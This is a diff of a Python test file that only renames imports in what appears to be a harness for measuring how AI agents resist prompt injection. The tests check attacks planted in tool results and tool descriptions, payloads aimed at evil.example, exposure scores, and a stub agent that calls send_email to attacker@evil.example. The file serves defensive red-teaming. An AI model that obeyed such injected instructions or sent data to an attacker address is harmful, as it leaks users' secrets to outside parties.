@@ -9,9 +9,9 @@ sys.path.insert(0, str(Path(__file__).parent.parent / "lab" / "collaborator"))
 
 from server import make_server  # noqa: E402
 
-from dyepack.gateway.live import DEFAULT_PAYLOAD, injection_spec, live_run  # noqa: E402
-from dyepack.gateway.mcp_sandbox import MCPSandbox  # noqa: E402
-from dyepack.scope import Gate, OutOfScope, parse_scope  # noqa: E402
+from taintline.gateway.live import DEFAULT_PAYLOAD, injection_spec, live_run  # noqa: E402
+from taintline.gateway.mcp_sandbox import MCPSandbox  # noqa: E402
+from taintline.scope import Gate, OutOfScope, parse_scope  # noqa: E402
 
 SERVER = str(Path(__file__).parent.parent / "lab" / "servers" / "notes_server.py")
 
@@ -124,8 +124,8 @@ def test_partial_effect_is_reported_but_is_not_success(tmp_path, sink):
 
 
 def test_gullible_flag_sets_system_prompt(tmp_path, monkeypatch):
-    import dyepack.cli as cli
-    from dyepack.gateway import live
+    import taintline.cli as cli
+    from taintline.gateway import live
     seen = {}
     monkeypatch.setattr(cli, "make_agent_factory", lambda kind, model, system, *a: seen.setdefault("s", system))
     monkeypatch.setattr(live, "live_run", lambda *a, **k: {
@@ -146,7 +146,7 @@ def test_sink_must_be_in_scope(tmp_path, sink):
 
 
 def test_unresponsive_sink_fails_fast(tmp_path):
-    from dyepack.gateway.live import SinkUnavailable
+    from taintline.gateway.live import SinkUnavailable
     with pytest.raises(SinkUnavailable):
         live_run(_gate("notes", "127.0.0.1:9"), Careful, "notes", sys.executable, [SERVER],
                  "http://127.0.0.1:9", None, 1, tmp_path)
@@ -164,9 +164,9 @@ class NoteReader(Gullible):
 
 
 def test_live_suite_runs_attacks_by_tasks_with_baseline(tmp_path, sink):
-    from dyepack.attacks import load_attacks
-    from dyepack.cli import LIVE_ATTACKS
-    from dyepack.gateway.live import LIVE_TASKS, live_suite, suite_markdown
+    from taintline.attacks import load_attacks
+    from taintline.cli import LIVE_ATTACKS
+    from taintline.gateway.live import LIVE_TASKS, live_suite, suite_markdown
     url, srv = sink
     gate = _gate("notes", url.split("//")[1])
     attacks = load_attacks(str(LIVE_ATTACKS))[:2]
@@ -179,8 +179,8 @@ def test_live_suite_runs_attacks_by_tasks_with_baseline(tmp_path, sink):
 
 
 def test_live_attack_library_loads_with_expected_surfaces():
-    from dyepack.attacks import load_attacks
-    from dyepack.cli import LIVE_ATTACKS
+    from taintline.attacks import load_attacks
+    from taintline.cli import LIVE_ATTACKS
     a = load_attacks(str(LIVE_ATTACKS))
     assert len(a) >= 8 and {x.surface for x in a} == {"tool_result", "tool_description"}
     assert all("evil.example" in x.payload for x in a)
@@ -198,7 +198,7 @@ def test_stale_sink_hits_do_not_count(tmp_path, sink):
 
 
 def test_canaries_differ_between_runs_with_same_seed(tmp_path, sink):
-    from dyepack.gateway.live import live_trial
+    from taintline.gateway.live import live_trial
     url, _ = sink
     gate = _gate("notes", url.split("//")[1])
     a = live_trial(gate, Careful, "notes", sys.executable, [SERVER], url, None, 7, tmp_path)
@@ -220,11 +220,11 @@ def test_attacker_contact_without_secret_is_not_a_disagreement(tmp_path, sink):
 
 
 def _suite(tmp_path, sink, agent_cls, inject_attacks=None):
-    from dyepack.attacks import load_attacks
-    from dyepack.gateway.live import LIVE_TASKS, live_suite
+    from taintline.attacks import load_attacks
+    from taintline.gateway.live import LIVE_TASKS, live_suite
     url, _ = sink
     gate = _gate("notes", url.split("//")[1])
-    attacks = load_attacks(str(Path(__file__).parent.parent / "src" / "dyepack" / "attacks" / "live"))[:2]
+    attacks = load_attacks(str(Path(__file__).parent.parent / "src" / "taintline" / "attacks" / "live"))[:2]
     return live_suite(gate, agent_cls, "notes", sys.executable, [SERVER], url, attacks, LIVE_TASKS[:1], 1, tmp_path)
 
 
@@ -243,7 +243,7 @@ def test_live_suite_exposure_score_and_summary(tmp_path, sink):
     assert sm["headline"] > 0 and sm["worst_case"] and sm["baseline_false_alarm"] == 0
     assert all("exposure" in p and p["successes"] == p["delivered"] for p in res["pairs"])
     assert max(p["max_severity"] for p in res["pairs"]) == 10
-    assert "Exposure score" in __import__("dyepack.gateway.live", fromlist=["x"]).suite_markdown(res)
+    assert "Exposure score" in __import__("taintline.gateway.live", fromlist=["x"]).suite_markdown(res)
 
 
 def test_careful_agent_scores_zero(tmp_path, sink):
@@ -255,7 +255,7 @@ def test_label_sheet_and_gate0_accept_live_results(tmp_path, sink):
     import csv
     import json as _json
 
-    from dyepack.labeling import gate0, make_sheet
+    from taintline.labeling import gate0, make_sheet
     live = tmp_path / "live.json"
     live.write_text(_json.dumps(_suite(tmp_path, sink, ObeysAny)))
     out = make_sheet([str(live)], n=4, out_dir=str(tmp_path / "labels"))
@@ -281,7 +281,7 @@ class Looper:
     def run(self, prompt, sb):
         sb.call("read_note", {"name": "todo"})
         sb.call("send_email", {"recipient": "attacker@evil.example", "body": "x"})   # rejected
-        from dyepack.targets.own_agent import AgentTimeout
+        from taintline.targets.own_agent import AgentTimeout
         raise AgentTimeout("no final answer after 8 turns")
 
 
